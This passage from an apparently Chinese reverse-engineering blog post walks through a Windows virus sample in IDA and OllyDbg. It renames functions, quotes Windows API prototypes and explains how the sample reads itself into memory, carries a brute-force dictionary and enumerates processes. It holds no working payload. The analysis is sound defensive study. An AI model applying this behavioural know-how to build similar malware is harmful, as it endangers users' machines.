class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><p>无参数，返回值是一个指向当前进程的命令行字符串的指针。</p><p>当执行完<code>GetModuleFileName()</code>函数后，在数据窗口可以看到该程序的绝对路径，并且绕过了<code>GetCommandLine()</code>。根据地址402792那一行的jnz跳转指令可知，<code>sub_40277C()</code>的功能是要么获取当前程序绝对路径，要么获取当前命令行缓冲区的指针。</p><img src="/posts/a48809a5/6.1.3.png" class="" title="sub_40277C()函数分析"><p>将该函数重命名为<code>GetFilePathAndName()</code>。</p><h3 id="6-1-2-sub-405684"><a href="#6-1-2-sub-405684" class="headerlink" title="6.1.2 sub_405684"></a>6.1.2 sub_405684</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_405684@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.4.png" class="" title="sub_405684()函数分析"><p>进入<code>sub_405684()</code>函数，发现一个小循环，遇到斜杠、反斜杠或冒号则跳出循环。它的目的要么是想不包含病毒文件名的路径，要么想获取样本的名字。</p><img src="/posts/a48809a5/6.1.5.png" class="" title="sub_405684()函数分析"><p>来到地址4056D8时，这三个寄存器存的值的含义如下：</p><p>EAX存的是绝对路径；ECX存的是在绝对路径中程序名的索引值；EDX被置为1，暂时不知道有什么含义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__userpurge sub_40412C@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ecx&gt;, _DWORD *a4)</span><br></pre></td></tr></table></figure><p><code>__userpurge</code>和<code>__usercall</code>一样，都是用户自定义函数调用约定，唯一的区别是<code>__userpurge</code>表示<strong>由被调用者清理堆栈</strong>。</p><p>进入<code>sub_40412C()</code>函数，有两个子函数分别是<code>sub_403D34()</code>和<code>sub_403C44()</code>，这两个函数前面都有分析过，<code>sub_403D34()</code>分配一定大小的内存空间，进行字符串拷贝。<code>sub_403C44()</code>初始化寄存器。</p><img src="/posts/a48809a5/6.1.6.png" class="" title="sub_40412C()函数分析"><p>发现<code>sub_405684()</code>其实是想获取不包含病毒文件名的路径，将它更名为<code>GetFilePath()</code>。</p><h4 id="6-1-2-1-局部变量"><a href="#6-1-2-1-局部变量" class="headerlink" title="6.1.2.1 局部变量"></a>6.1.2.1 局部变量</h4><p>在<code>sub_405684()</code>函数里，可以看到一些局部变量。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040568C  |.  8945 FC       mov [local.1],eax</span><br><span class="line">0040568F  |.  8B45 FC       mov eax,[local.1]</span><br></pre></td></tr></table></figure><p>[local.1]表示第一个局部变量，存放在栈里的[ebp-4]的位置。</p><img src="/posts/a48809a5/6.1.7.png" class="" title="sub_405684()函数分析"><p>以此类推，[local.2]存放在[ebp-8]的位置。</p><p>如果想让它直接显示与ebp的偏移，可在选项 -&gt; 调试设置 -&gt; 分析1 -&gt; 取消勾选“显示函数中的参数及局部变量”。或者选中相应行，按空格键查看汇编代码。</p><img src="/posts/a48809a5/6.1.8.png" class=""><h3 id="6-1-3-sub-403ED4"><a href="#6-1-3-sub-403ED4" class="headerlink" title="6.1.3 sub_403ED4"></a>6.1.3 sub_403ED4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> **__usercall sub_403ED4@&lt;eax&gt;(<span class="type">char</span> **result@&lt;eax&gt;, <span class="type">char</span> *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.9.png" class="" title="sub_403ED4()函数分析"><p>这个函数在5.2.2.2也分析过，但当时只是初始化，了解得很笼统。但结合实例很容易分析出来这是一个字符串拼接函数。</p><img src="/posts/a48809a5/6.1.10.png" class="" title="sub_403ED4()函数分析"><p>将<code>sub_403ED4()</code>更名为<code>StringCat()</code>。</p><h3 id="6-1-4-sub-4057A4"><a href="#6-1-4-sub-4057A4" class="headerlink" title="6.1.4 sub_4057A4"></a>6.1.4 sub_4057A4</h3><p>进入无需传参的<code>sub_4057A4()</code>，有一个子函数<code>sub_40573C()</code>也无需传参，继续进入，发现有4个API函数。</p><p><code>FindFirstFile()</code>查找指定目录的第一个文件或目录并返回它的句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">FindFirstFileA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  LPCSTR             lpFileName,</span></span><br><span class="line"><span class="params">  [out] LPWIN32_FIND_DATA  lpFindFileData</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpFileName：指向字符串的指针，用于指定一个有效的目录。</li><li>lpFindFileData：指向一个<code>WIN32_FIND_DATA</code>的指针，用于存放找到文件或目录的信息。</li></ul><p>返回值：</p><ul><li>如果成功，则返回找到文件或目录的句柄。在<code>FindNextFile()</code>和<code>FindClose()</code>函数中会用到此句柄。</li><li>如果失败，返回<code>INVALID_HANDLE_VALUE</code>。要获得更多的信息调用<code>GetLastError()</code>函数。</li></ul><p><code>FindClose()</code>用于关闭由<code>FindFirstFile()</code>函数创建的一个搜索句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">FindClose</span><span class="params">(</span></span><br><span class="line"><span class="params">    HANDLE hFindFile <span class="comment">// file search handle</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>hFindFile：<code>FindFirstFile()</code>创建的句柄。</li></ul><p>返回值：</p><ul><li>调用成功，返回一个非0值。</li><li>失败，返回0，可利用<code>GetLastError()</code>来得到错误信息。</li></ul><p><code>FileTimeToLocalFileTime()</code>将一个FILETIME结构转换成本地时间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">FileTimeToLocalFileTime</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  <span class="type">const</span> FILETIME* lpFileTime,</span></span><br><span class="line"><span class="params">  [out] LPFILETIME lpLocalFileTime</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpFileTime：指向FILETIME结构，其中包含要转换为本地文件时间的基于UTC的文件时间。</li><li>lpLocalFileTime：指向FILETIME结构的指针，以接收转换后的本地文件时间。</li></ul><p>返回值：非0表示成功，0表示失败。</p><p><code>FileTimeToDosDateTime()</code>将一个 FILETIME 值转换成 MS-DOS 日期和时间值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">FileTimeToDosDateTime</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  <span class="type">const</span> FILETIME *lpFileTime,</span></span><br><span class="line"><span class="params">  [out] LPWORD         lpFatDate,</span></span><br><span class="line"><span class="params">  [out] LPWORD         lpFatTime</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li><p>lpFileTime：指向 FILETIME 结构的指针，其中包含要转换为 MS-DOS 日期和时间格式的文件时间。</p></li><li><p>lpFatDate：指向接收MS-DOS日期的变量的指针。日期是以下格式的压缩值。</p><p>| 比特 | 说明                                                |<br>| —— | —————————————————————————- |<br>| 0-4  | Day of the month (1–31)                             |<br>| 5-8  | Month (1 = January, 2 = February, etc.)             |<br>| 9-15 | Year offset from 1980 (add 1980 to get actual year) |</p></li><li><p>lpFatTime：指向接收MS-DOS时间的变量的指针。时间是以下格式的压缩值。</p><p>| 比特 | 说明                           |<br>| —— | ——————————————— |<br>| 0-4  | 秒除以2                        |<br>| 5-8  | Minute (0–59)                  |<br>| 9-15 | Hour (0–23 on a 24-hour clock) |</p></li></ul><p>返回值：非0表示成功，0表示失败。</p><p>这就很好懂啦，整个<code>sub_4057A4()</code>做的就是某个检查文件是否存在当前目录，如果存在则转换成文件的本地时间和DOS日期。将它更名为<code>CheckFileExist()</code>。</p><h3 id="6-1-5-sub-4078E0"><a href="#6-1-5-sub-4078E0" class="headerlink" title="6.1.5 sub_4078E0"></a>6.1.5 sub_4078E0</h3><p>由于当前没有<code>Desktop_.ini</code>文件，所以下面的一系列call也都被跳过了。我们先跟着流程跳过，稍后回来到这里再分析它们。</p><img src="/posts/a48809a5/6.1.11.png" class="" title="sub_408024()函数分析"><p>再次调用<code>sub_40277C()</code>，也就是<code>GetFilePathAndName()</code>后，调用<code>sub_4078E0()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_4078E0@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">char</span> **a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ebx&gt;, <span class="type">int</span> a4@&lt;edi&gt;, <span class="type">int</span> a5@&lt;esi&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.12.png" class="" title="sub_4078E0()函数分析"><h4 id="6-1-5-1-sub-402EB8"><a href="#6-1-5-1-sub-402EB8" class="headerlink" title="6.1.5.1 sub_402EB8"></a>6.1.5.1 sub_402EB8</h4><p>进去到<code>sub_402EB8()</code>后只有一个函数<code>sub_402DD8()</code>。进去发现又是API函数。</p><p><code>CreateFile()</code>创建或打开文件，<code>GetStdHandle()</code>获取句柄，<code>GetLastError()</code>收集错误信息。</p><img src="/posts/a48809a5/6.1.13.png" class="" title="sub_402DD8()函数分析"><p>发现它打开了它自己<code>setup.exe</code>。</p><h4 id="6-1-5-2-sub-402614"><a href="#6-1-5-2-sub-402614" class="headerlink" title="6.1.5.2 sub_402614"></a>6.1.5.2 sub_402614</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __thiscall __spoils&lt;ecx&gt; <span class="title function_">sub_402614</span><span class="params">(<span class="type">void</span> *this)</span></span><br></pre></td></tr></table></figure><p>如果使用<code>__spoils</code>关键字，指定的列表将覆盖标准的破坏列表。对于x86，标准的破坏列表是<eax, edx, ecx>，破坏列表也可以为空。</p><p>进入该函数里面只有一个函数<code>sub_40499C()</code>，里面只有一个API函数<code>TlsGetValue()</code>，该API函数的作用是检索调用线程的线程本地存储(TLS)槽中指定 TLS 索引的值。进程的每个线程对于每个 TLS 索引都有自己的槽。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LPVOID <span class="title function_">TlsGetValue</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD dwTlsIndex</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>dwTlsIndex：由<code>TlsAlloc()</code>函数分配的TLS索引。</li></ul><p>返回值：</p><ul><li>如果函数成功，则返回值是存储在与指定索引关联的调用线程TLS插槽中的值。如果<code>dwTlsIndex</code>是成功调用<code>TlsAlloc()</code>分配的有效索引，则此函数始终成功。</li><li>如果函数失败，则返回值为零。要获取扩展的错误信息，请调用<code>GetLastError()</code>。</li></ul><p>当然这个API函数基本上都被跳过了，因为前面都没有用到<code>TlsAlloc()</code>函数。</p><h4 id="6-1-5-3-sub-402D28"><a href="#6-1-5-3-sub-402D28" class="headerlink" title="6.1.5.3 sub_402D28"></a>6.1.5.3 sub_402D28</h4><p>里面有个API函数<code>GetFileSize()</code>用来获取文件大小。文件大小为0xEC00。</p><img src="/posts/a48809a5/6.1.21.png" class="" title="sub_402D28()函数分析"><h4 id="6-1-5-4-sub-402CBC"><a href="#6-1-5-4-sub-402CBC" class="headerlink" title="6.1.5.4 sub_402CBC"></a>6.1.5.4 sub_402CBC</h4><p>里面有两个函数：<code>sub_402CD8()</code>和<code>sub_402D28()</code>。后者已经在上面分析过了。<code>sub_402CD8()</code>里有个API函数<code>SetFilePointer()</code>，用来设置文件指针。</p><h4 id="6-1-5-5-sub-402C28"><a href="#6-1-5-5-sub-402C28" class="headerlink" title="6.1.5.5 sub_402C28"></a>6.1.5.5 sub_402C28</h4><p>在这个函数里面，可以看到将<code>ReadFile()</code>函数入栈，调用<code>sub_402B9C()</code>。</p><img src="/posts/a48809a5/6.1.14.png" class="" title="sub_402C28()函数分析"><p>进入<code>sub_402B9C()</code>，执行<code>ReadFile()</code>函数。这里的[arg.2]表示[ebp+0xC]。</p><img src="/posts/a48809a5/6.1.15.png" class="" title="sub_402C28()函数分析"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">ReadFile</span><span class="params">(</span></span><br><span class="line"><span class="params">    HANDLE hFile,            <span class="comment">//文件的句柄</span></span></span><br><span class="line"><span class="params">    LPVOID lpBuffer,          <span class="comment">//用于保存读入数据的一个缓冲区</span></span></span><br><span class="line"><span class="params">    DWORD nNumberOfBytesToRead,    <span class="comment">//要读入的字节数</span></span></span><br><span class="line"><span class="params">    LPDWORD lpNumberOfBytesRead,    <span class="comment">//指向实际读取字节数的指针</span></span></span><br><span class="line"><span class="params">    LPOVERLAPPED lpOverlapped</span></span><br><span class="line"><span class="params">    <span class="comment">//如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。</span></span></span><br><span class="line"><span class="params">    <span class="comment">//该结构定义了一次异步读取操作。否则，应将这个参数设为NULL</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>可以看到它将自己读到了内存中去。</p><img src="/posts/a48809a5/6.1.16.png" class="" title="sub_402C28()函数分析"><h4 id="6-1-5-6-sub-403D34、sub-403ED4和sub-402CBC"><a href="#6-1-5-6-sub-403D34、sub-403ED4和sub-402CBC" class="headerlink" title="6.1.5.6 sub_403D34、sub_403ED4和sub_402CBC"></a>6.1.5.6 sub_403D34、sub_403ED4和sub_402CBC</h4><p>这三个函数上面都有分析过，<code>sub_403D34()</code>是<code>StringCopy()</code>，<code>sub_403ED4()</code>是<code>StringCat()</code>，<code>sub_402CBC()</code>设置文件指针。</p><p>发现这是一个循环，在跳转处下断点，关注数据窗口发现有哪些数据被修改了。</p><img src="/posts/a48809a5/6.1.17.png" class="" title="循环分析"><p>第一次，将自己一部分写入到内存中：</p><img src="/posts/a48809a5/6.1.18.png" class="" title="循环分析"><p>第二次，继续将自己一部分写入到内存中：</p><img src="/posts/a48809a5/6.1.19.png" class="" title="循环分析"><p>第三次，将剩下的部分写入到内存中：</p><img src="/posts/a48809a5/6.1.20.png" class="" title="循环分析"><p>结合循环中的汇编代码分析，文件大小为0xEC00，每次读取0x5000进行拷贝和拼接，所以这个循环是将自身读到内存中去。</p><p>其中，我们可以看到一些“1234”等等的字符串，那是病毒作者将爆破字典也写入到了病毒里面，企图利用暴力破解的方式来攻破计算机中的某些验证机制。</p><h4 id="6-1-5-7-sub-402C48"><a href="#6-1-5-7-sub-402C48" class="headerlink" title="6.1.5.7 sub_402C48"></a>6.1.5.7 sub_402C48</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_402C48@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.22.png" class="" title="sub_402C48()函数分析"><p>进入后，继续进入<code>sub_402DB0()</code>，继续进入<code>sub_4028FC()</code>，里面有个<code>CloseHandle()</code>函数，用来关闭我们刚才打开的程序。其它函数都不太重要，不用在意。</p><h4 id="6-1-5-8-sub-403ECC、sub-40412C和sub-403C44"><a href="#6-1-5-8-sub-403ECC、sub-40412C和sub-403C44" class="headerlink" title="6.1.5.8 sub_403ECC、sub_40412C和sub_403C44"></a>6.1.5.8 sub_403ECC、sub_40412C和sub_403C44</h4><p><code>sub_403ECC()</code>函数是求字符串长度的，在这里是求三次循环后复制的字符串长度，应该为0xF000。执行完这个函数后，与文件大小0xEC00相比，跳转未实现，需要进入<code>sub_40412C()</code>函数。</p><img src="/posts/a48809a5/6.1.23.png" class="" title="sub_403ECC()函数分析"><p><code>sub_40412C()</code>函数我们也分析过，它里面有个函数是<code>StringCopy()</code>。</p><img src="/posts/a48809a5/6.1.24.png" class="" title="sub_40412C()函数分析"><p><code>sub_403C44()</code>也分析过，初始化寄存器。</p><img src="/posts/a48809a5/6.1.25.png" class="" title="sub_403C44()函数分析"><h4 id="6-1-5-9-总结"><a href="#6-1-5-9-总结" class="headerlink" title="6.1.5.9 总结"></a>6.1.5.9 总结</h4><p>至此，<code>sub_4078E0()</code>就全分析完了，样本将自己读取到内存上，是因为样本中有爆破字典，企图利用暴力破解的方式来攻破计算机中的某些验证机制。</p><p>将该函数更名为<code>WriteVirusInfoToMem()</code>。</p><h3 id="6-1-6-sub-40532C"><a href="#6-1-6-sub-40532C" class="headerlink" title="6.1.6 sub_40532C"></a>6.1.6 sub_40532C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DWORD __usercall sub_40532C@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">char</span> **a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><p><code>sub_403ECC()</code>求文件绝对路径的长度，<code>sub_403D34()</code>是<code>StringCopy()</code>，还有个API函数，<code>CharUpperBuff()</code>表示将字符串中的小写字母全都转化为大写字母。</p><img src="/posts/a48809a5/6.1.26.png" class="" title="sub_40532C()函数分析"><p>所以这个函数的功能是将文件路径改为大写字母，更名为<code>UpperFilePath()</code>。</p><h3 id="6-1-7-sub-4054BC"><a href="#6-1-7-sub-4054BC" class="headerlink" title="6.1.7 sub_4054BC"></a>6.1.7 sub_4054BC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> **__usercall sub_4054BC@&lt;eax&gt;(<span class="type">int</span> *a1@&lt;eax&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.27.png" class="" title="sub_4054BC()函数分析"><p>这里有个API函数<code>GetSystemDirectoryA()</code>，原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UINT WINAPI <span class="title function_">GetSystemDirectory</span><span class="params">(</span></span><br><span class="line"><span class="params">    __out LPTSTR lpBuffer,</span></span><br><span class="line"><span class="params">    __in UINT uSize</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpBuffer：用于装载系统目录路径名的一个字串缓冲区。</li><li>uSize：lpBuffer字串的最大长度。</li></ul><p>返回值：装载到lpBuffer缓冲区的字符数量。如lpBuffer不够大，不能容下文件名，则返回要求的缓冲区长度。</p><p>它的作用是获得系统目录<code>C:\WINDOWS\system32</code>，同时也是这个函数的主要功能。将它更名为<code>GetSystemDirectory()</code>。</p><h3 id="6-1-8-sub-403F8C"><a href="#6-1-8-sub-403F8C" class="headerlink" title="6.1.8 sub_403F8C"></a>6.1.8 sub_403F8C</h3><img src="/posts/a48809a5/6.1.28.png" class="" title="sub_403F8C()函数分析"><p>从IDA中可以很容易理解<code>sub_403F8C()</code>函数的作用，也就是将这三个字符串拼接成路径的地址存到v8当中。</p><p>为了验证猜想，在OD中步过<code>sub_403F8C()</code>试试。</p><img src="/posts/a48809a5/6.1.29.png" class="" title="sub_403F8C()函数分析"><img src="/posts/a48809a5/6.1.30.png" class="" title="sub_403F8C()函数分析"><img src="/posts/a48809a5/6.1.31.png" class="" title="sub_403F8C()函数分析"><p>所以这个函数也可以看成是字符串拼接函数，它是从后往前拼接的，更名为<code>ReverseStringCat()</code>。</p><h3 id="6-1-9-sub-4060D4"><a href="#6-1-9-sub-4060D4" class="headerlink" title="6.1.9 sub_4060D4"></a>6.1.9 sub_4060D4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__usercall sub_4060D4@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.32.png" class="" title="sub_4060D4()函数分析"><h4 id="6-1-9-1-sub-405028"><a href="#6-1-9-1-sub-405028" class="headerlink" title="6.1.9.1 sub_405028"></a>6.1.9.1 sub_405028</h4><p>进入函数内部，进入<code>sub_405028()</code>，再进入<code>sub_404DAC()</code>，看到一连串的API函数。</p><img src="/posts/a48809a5/6.1.33.png" class="" title="sub_404DAC()函数分析"><p>使用<code>GetModuleHandleA()</code>获取<code>kernel32.dll</code>的句柄，再利用<code>kernel32.dll</code>中的<code>GetProcAddress()</code>函数获取所需要的API函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FARPROC <span class="title function_">GetProcAddress</span><span class="params">(</span></span><br><span class="line"><span class="params">    HMODULE hModule, <span class="comment">// DLL模块句柄</span></span></span><br><span class="line"><span class="params">    LPCSTR lpProcName <span class="comment">// 函数名</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>hModule：[in] 包含此函数的DLL模块的句柄。<code>LoadLibrary()</code>、<code>AfxLoadLibrary()</code>或者<code>GetModuleHandle()</code>函数可以返回此句柄。</li><li>lpProcName：[in] 包含函数名的以NULL结尾的字符串，或者指定函数的序数值。如果此参数是一个序数值，它必须在低字，高字必须为0。</li></ul><p>返回值：</p><ul><li>如果函数调用成功，返回值是DLL中的输出函数地址。</li><li>如果函数调用失败，返回值是NULL。得到进一步的错误信息，调用函数GetLastError。</li></ul><p>可以看到它调用了非常多的API函数，各API函数的功能如下：</p><div class="table-container"><table><thead><tr><th>API函数</th><th>功能</th></tr></thead><tbody><tr><td>CreateToolhelp32Snapshot</td><td>通过获取进程信息为指定的进程、进程使用的堆、模块、线程建立一个快照。</td></tr><tr><td>Heap32ListFirst</td><td>检索有关指定进程已分配的第一个堆的信息。</td></tr><tr><td>Heap32ListNext</td><td>检索有关进程已分配的下一个堆的信息。</td></tr><tr><td>Heap32First</td><td>检索有关已由进程分配的堆的第一个块的信息。</td></tr><tr><td>Heap32Next</td><td>检索有关已由进程分配的堆的下一个块的信息。</td></tr><tr><td>Toolhelp32ReadProcessMemory</td><td>将分配给另一个进程的内存复制到应用程序提供的缓冲区中。</td></tr><tr><td>Process32First/Process32FirstW</td><td>检索有关系统快照中遇到的第一个进程的信息。</td></tr><tr><td>Process32Next/Process32NextW</td><td>检索有关系统快照中记录的下一个进程的信息。</td></tr><tr><td>Thread32First</td><td>检索有关系统快照中遇到的任何进程的第一个线程的信息。</td></tr><tr><td>Thread32Next</td><td>检索有关系统内存快照中遇到的任何进程的下一个线程的信息。</td></tr><tr><td>Module32First/Module32FirstW</td><td>检索有关与进程关联的第一个模块的信息。</td></tr><tr><td>Module32Next/Module32NextW</td><td>检索有关与进程或线程关联的下一个模块的信息。</td></tr></tbody></table></div><p>将这些API函数的地址存到用户程序的某个地方。</p><img src="/posts/a48809a5/6.1.34.png" class="" title="sub_404DAC()函数分析"><p>存好后执行<code>CreateToolhelp32Snapshot()</code>获取当前进程快照。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateToolhelp32Snapshot</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD dwFlags,</span></span><br><span class="line"><span class="params">  [in] DWORD th32ProcessID</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.35.png" class="" title="sub_405028()函数分析"><p>Flags为2表示在快照中包含系统中的所有进程。要枚举这些进程，请参见 <code>Process32First()</code>。 ProcessID为0表示当前进程。如果调用成功，返回快照的句柄，此快照的句柄为0x98。</p><p>将它更名为<code>CreateSnapshot()</code>。</p><h4 id="6-1-9-2-sub-405048"><a href="#6-1-9-2-sub-405048" class="headerlink" title="6.1.9.2 sub_405048"></a>6.1.9.2 sub_405048</h4><p>跟<code>sub_405028()</code>一样调用<code>sub_404DAC()</code>，但这次用的是<code>Process32First()</code>，用来检索有关系统快照中遇到的第一个进程的信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">Process32First</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HANDLE           hSnapshot,</span></span><br><span class="line"><span class="params">  [in, out] LPPROCESSENTRY32 lppe</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>hSnapshot：从上次调用<code>CreateToolhelp32Snapshot()</code>函数返回的快照句柄。</li><li>lppe：指向PROCESSENTRY32结构的指针。它包含进程信息，如可执行文件的名称、进程标识符和父进程的进程标识符。</li></ul><img src="/posts/a48809a5/6.1.36.png" class="" title="sub_405048()函数分析"><p>将它更名为<code>ProcessFirst()</code>。</p><h4 id="6-1-9-3-sub-406028"><a href="#6-1-9-3-sub-406028" class="headerlink" title="6.1.9.3 sub_406028"></a>6.1.9.3 sub_406028</h4><p>进入循环，先看<code>sub_406028()</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_406028@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, _DWORD *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.37.png" class="" title="sub_4060D4()函数分析"><p>进入<code>sub_406028()</code>函数，可以看到这也是一个字符串拷贝函数，将eax存的内容拷贝到edx存的地址处。</p><img src="/posts/a48809a5/6.1.38.png" class="" title="sub_406028()函数分析"><h4 id="6-1-9-4-sub-405FA8"><a href="#6-1-9-4-sub-405FA8" class="headerlink" title="6.1.9.4 sub_405FA8"></a>6.1.9.4 sub_405FA8</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_405FA8@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.39.png" class="" title="sub_405FA8()函数分析"><p>进入<code>sub_405FA8()</code>函数，前面函数都分析过，无非是初始化、分配空间、求字符串长度。重要的是循环，进入循环后第一个函数<code>sub_402804()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 __usercall sub_402804@&lt;al&gt;(<span class="type">unsigned</span> __int8 result@&lt;al&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; result &lt;= <span class="string">&#x27;z&#x27;</span> )</span><br><span class="line">    result -= <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在IDA中可以看出这个函数是将小写字母转换为大写字母。</p><p>第二个函数<code>sub_404124()</code>，eax中存的是内容的地址的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__usercall sub_404124@&lt;eax&gt;(<span class="type">char</span> **eax0@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_4040D8(eax0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.40.png" class="" title="sub_404124()函数分析"><img src="/posts/a48809a5/6.1.41.png" class="" title="sub_404124()函数分析"><p><code>sub_404124()</code>很像我们刚开始分析的<code>sub_403C98()</code>，将<code>spoclsv.exe</code>字符串拷贝到地址0xB38048中。继续进行循环。</p><img src="/posts/a48809a5/6.1.42.png" class="" title="sub_405FA8()函数分析"><p>将地址0xB38048的字符’s’修改为’S’，由此可以推测这个循环是将地址0xB38048的字符串转换成大写形式。</p><h4 id="6-1-9-5-sub-403EB4"><a href="#6-1-9-5-sub-403EB4" 